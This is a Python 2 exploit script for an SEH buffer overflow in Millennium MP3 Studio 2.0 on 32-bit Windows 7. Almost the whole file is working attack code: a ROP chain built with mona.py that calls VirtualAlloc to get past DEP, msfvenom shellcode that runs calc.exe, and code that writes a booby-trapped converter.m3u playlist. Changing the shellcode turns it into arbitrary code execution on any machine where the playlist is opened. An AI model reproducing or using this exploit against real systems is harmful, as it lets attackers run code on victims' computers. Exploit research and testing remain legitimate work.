#!/usr/bin/env python2

# Exploit Title: Millennium mp3 studio 2.0 SEH OVerflow (no DEP, no ASLR)
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A

import struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [

      #[---INFO:gadgets_to_set_esi:---]
      0x10030496,  # POP EAX # RETN [MSA2Mfilter03.dll] 
      0x1004f060,  # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
      0x1004f060,  # ptr to &VirtualAlloc() [IAT MSA2Mfilter03.dll]
      0x1003239f,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSA2Mfilter03.dll] 
      0x10040754,  # PUSH EAX # POP ESI # POP EBP # LEA EAX,DWORD PTR DS:[ECX+EAX+D] # POP EBX # RETN    ** [MSA2Mfilter03.dll] **   |  ascii {PAGE_EXECUTE_READ}
      0x41414141,
      0x41414141,

      #[---INFO:gadgets_to_set_ebp:---]
      0x1003fbed,  # POP EBP # RETN [MSA2Mfilter03.dll] 
      0x10012316,  # ADD ESP,8 # retn (# need to jump 8 bytes ahead due to final eax value which is not 0x90909090
      
  
      #[---INFO:gadgets_to_set_edx:---]
      0x10030496,  # POP EAX # RETN [MSA2Mfilter03.dll] 
      0xFFFFF001,  # -0x00000999 -> eax
      0x1004d1c4,  # NEG EAX # POP EBX # RETN    ** [MSA2Mfilter03.dll] **   |   {PAGE_EXECUTE_READ}
      0x41414141,  # Filler
      0x1003c1a7,  # INC EAX # RETN    ** [MSA2Mfilter03.dll] **   |
      0x10034735,  # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN    ** [MSA2Mfilter03.dll] **  
      0x10029bac,  # XOR EDX,EDX # RETN    ** [MSA2Mfilter03.dll] **   |   {PAGE_EXECUTE_READ}  
      0x1002a06e,  # ADD EDX,EBX # POP EBX # RETN 0x10    ** [MSA2Mfilter03.dll] **   |   {PAGE_EXECUTE_READ}    


    #[---INFO:gadgets_to_set_ebx:---]
      0x10030496,  # POP EAX # RETN [MSA2Mfilter03.dll] 
      0x10030496,  # POP EAX # RETN [MSA2Mfilter03.dll] 
      0xFFFFFFFF,  # Filler
      0xFFFFFFFF,  # Filler
      0xFFFFFFFF,  # Filler
      0xFFFFFFFF,  # Filler
      0xFFFFFFFF,  # -0x00000001-> eax
      0x1004d1c4,  # NEG EAX # POP EBX # RETN    ** [MSA2Mfilter03.dll] **   |   {PAGE_EXECUTE_READ}
      0x41414141,  # Filler
      0x10034735,  # PUSH EAX # ADD AL,5D # MOV EAX,1 # POP EBX # RETN    ** [MSA2Mfilter03.dll] **  

      #[---INFO:gadgets_to_set_ecx:---]
      0x1002820e,  # POP ECX # RETN    ** [MSA2Mfilter03.dll] **   
      0xFFFFFFFF,  # -0x00000001-> ecx     # Then increase ecx by 1 to reach 0x40
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 
      0x10031ebe,  # INC ECX # AND EAX,8 

      #[---INFO:gadgets_to_set_edi:---]
      0x100301c6,  # POP EDI # RETN [MSA2Mfilter03.dll] 
      0x10031ec2,  # RETN (ROP NOP) [MSA2Mfilter03.dll]

      #[---INFO:gadgets_to_set_eax:---]
      0x1002fb4d,  # POP EAX # RETN [MSA2Mfilter03.dll] 
      0x90909090,  # nop

      # Trick to get eax as eax = 0x004050d4 -> address of "pushad + retn"
      # then push eax + ret
      # then push esp + ret 
      # so EIP returns to the memory address stored in eax
      0x10030496, # pop eax # retn
      0xA1E84F6A,
      0x1004e0f1, # ADD EAX,5E58016A # RETN --> eax becomes 0x004050d4 (pushad # retn)

      0x10040ce5, # push eax # retn
      0x90909090,
      0x1003df73, # push esp # retn
      # IMPORTANT: EAX pushed by pushad is NOT 0x90909090 -> so the ebp must not be a simple jmp esp
      # it has to do a small stack pivot to reach the shellcode
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



offset=17417

# msfvenom -p windows/exec cmd=calc.exe -b "\x0a\x00\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += b"\xba\x0e\xa1\xc8\x79\xd9\xd0\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x31\x31\x56\x13\x83\xee\xfc"
shellcode += b"\x03\x56\x01\x43\x3d\x85\xf5\x01\xbe\x76\x05"
shellcode += b"\x66\x36\x93\x34\xa6\x2c\xd7\x66\x16\x26\xb5"
shellcode += b"\x8a\xdd\x6a\x2e\x19\x93\xa2\x41\xaa\x1e\x95"
shellcode += b"\x6c\x2b\x32\xe5\xef\xaf\x49\x3a\xd0\x8e\x81"
shellcode += b"\x4f\x11\xd7\xfc\xa2\x43\x80\x8b\x11\x74\xa5"
shellcode += b"\xc6\xa9\xff\xf5\xc7\xa9\x1c\x4d\xe9\x98\xb2"
shellcode += b"\xc6\xb0\x3a\x34\x0b\xc9\x72\x2e\x48\xf4\xcd"
shellcode += b"\xc5\xba\x82\xcf\x0f\xf3\x6b\x63\x6e\x3c\x9e"
shellcode += b"\x7d\xb6\xfa\x41\x08\xce\xf9\xfc\x0b\x15\x80"
shellcode += b"\xda\x9e\x8e\x22\xa8\x39\x6b\xd3\x7d\xdf\xf8"
shellcode += b"\xdf\xca\xab\xa7\xc3\xcd\x78\xdc\xff\x46\x7f"
shellcode += b"\x33\x76\x1c\xa4\x97\xd3\xc6\xc5\x8e\xb9\xa9"
shellcode += b"\xfa\xd1\x62\x15\x5f\x99\x8e\x42\xd2\xc0\xc4"
shellcode += b"\x95\x60\x7f\xaa\x96\x7a\x80\x9a\xfe\x4b\x0b"
shellcode += b"\x75\x78\x54\xde\x32\x76\x1e\x43\x12\x1f\xc7"
shellcode += b"\x11\x27\x42\xf8\xcf\x6b\x7b\x7b\xfa\x13\x78"
shellcode += b"\x63\x8f\x16\xc4\x23\x63\x6a\x55\xc6\x83\xd9"
shellcode += b"\x56\xc3\xe7\xbc\xc4\x8f\xc9\x5b\x6d\x35\x16"


rop_chain = create_rop_chain()

buf  = "http://"
buf += "A"*offset
buf += rop_chain
buf += "\x90"*10
buf += shellcode


f = open("converter.m3u", "w")
f.write(buf)
f.close()
